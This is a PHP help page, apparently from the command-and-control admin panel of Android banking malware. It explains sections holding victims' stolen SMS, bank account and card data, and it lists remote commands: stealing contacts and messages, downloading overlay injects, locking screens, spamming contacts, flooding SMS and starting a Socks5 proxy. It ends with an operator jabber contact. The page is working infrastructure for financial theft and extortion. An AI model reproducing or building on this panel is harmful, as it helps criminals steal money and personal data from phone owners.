<?php
session_start();
require_once 'includes/auth_validate.php';
require_once './config/config.php';

include_once 'includes/header.php';
require_once 'includes/func.php';
?>


<div id="page-wrapper">
    <div class="row">
        <div class="col-lg-6">
            <h1 class="page-header">Guided tour</h1>
        </div>
        <div class="col-lg-6" style="">
            <div class="page-action-links text-right"></div>
        </div>
    </div>
    <!-- <?php include('./includes/flash_messages.php') ?> -->
    <!-- Guided tour -->

    <h3>Header panel description</h3>
    <ul >
        <li>
            <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a> - Page with common statistic.
        </li>
        <li>
            <a href="clients.php"><i class="fa fa-users"></i> Clients</a> - Page with clients and information about it. You can send a command to selected clients, or delete it. Also, you can enter into a client to see all information related to client.
        </li>
        <li>
            <a href="locked_clients.php"><i class="glyphicon glyphicon-lock"></i> Locked Clients</a> - All clients will be placed here after send the Screen_Lock command.
        </li>
        <li>
            <a href="commands.php"><i class="fa fa-terminal"></i> Commands</a> - All not sent client commands.
        </li>
 
        <li>
            <a href="list_log.php"><i class="fa fa-list"></i> Logs</a> - Client logs.
        </li>
        <li>
            <a href="list_sms.php"><i class="fa fa-list"></i> SMS</a> - List of clients SMS.
        </li>
        <li>
            <a href="list_banks.php"><i class="fa fa-list"></i> Banks</a> - Bank account information.
        </li>
        <li>
            <a href="list_cc.php"><i class="fa fa-list"></i> Cards</a> - Card information.
        </li>

        <li>
            <a href="admin_users.php"><i class="fa fa-users"></i> Users</a> - Users of admin panel.
        </li>
        <li>
            <a href="proxy.php"><i class="glyphicon glyphicon-link"></i> Proxy</a> - Proxy module connections page.
        </li>
        <li>
            <a href="settings.php"><i class="glyphicon glyphicon-cog"></i> Settings</a> - Nothing to comment...
        </li>
        <li>
            <a href="help.php"><i class="glyphicon glyphicon-exclamation-sign"></i> Help</a> - Just some little help.
        </li>
    </ul>

    <div class="row">
        <div class="col-lg-6">
            <h1 class="page-header">Command description</h1>
        </div>
        <div class="col-lg-6" style="">
            <div class="page-action-links text-right"></div>
        </div>
    </div>
    <table class="table table-striped table-bordered table-condensed">
        <thead>
        <tr>
            <th>Command name</th>
            <th>Descriptions</th>
        </tr>
        </thead>
        <tbody>
            <tr><td>Download_Contacts</td><td>Collect contacts and download to admin panel</td></tr>
            <tr>
                <td>Change_SMS_Manager</td>
                <td>Make request to change SMS manager</td>
            </tr>
            <tr>
                <td>ReInjection</td>
                <td>Download remote injection</td>
            </tr>
            <tr>
                <td>Delete_SMS</td>
                <td>Delete SMS on Android version 4.4 and below</td>
            </tr>
            <tr>
                <td>Download_All_SMS</td>
                <td>Download all SMS</td>
            </tr>
            <tr>
                <td>Download_All_App</td>
                <td>Download list of installed applications</td>
            </tr>
            <tr><td>Screen_Lock</td><td>ScreenLocker (Lock phone and screen)</td></tr>
            <tr><td>Unlock_Screen</td><td>Unlock screen (display will be available after the phone reboot)</td></tr>
            <tr><td>Spam_on_contacts</td><td>Spam to contacts from address book</td></tr>
            <tr><td>Update_Inject</td><td>Update injects</td></tr>
            <tr><td>Run_Notification</td><td>Start a notification</td></tr>
            <tr><td>Run_Necessary_Injection</td><td>Start selected inject</td></tr>
            <tr><td>Send_SMS</td><td>Send SMS</td></tr>
            <tr><td>Flood_SMS</td><td>SMS flood</td></tr>
            <tr><td>Run_Message_and_Injection</td><td>Start notification and inject of selected application</td></tr>
            <tr><td>StartSocks</td><td>Start the Socks5 module</td></tr>
        </tbody>
    </table>
    
<h3>Contacts</h3>
<tr><td>Contacts jabber: </td><td>napas@jabb.im</td></tr>
       
<!--Main container end-->


<?php include_once './includes/footer.php'; ?>

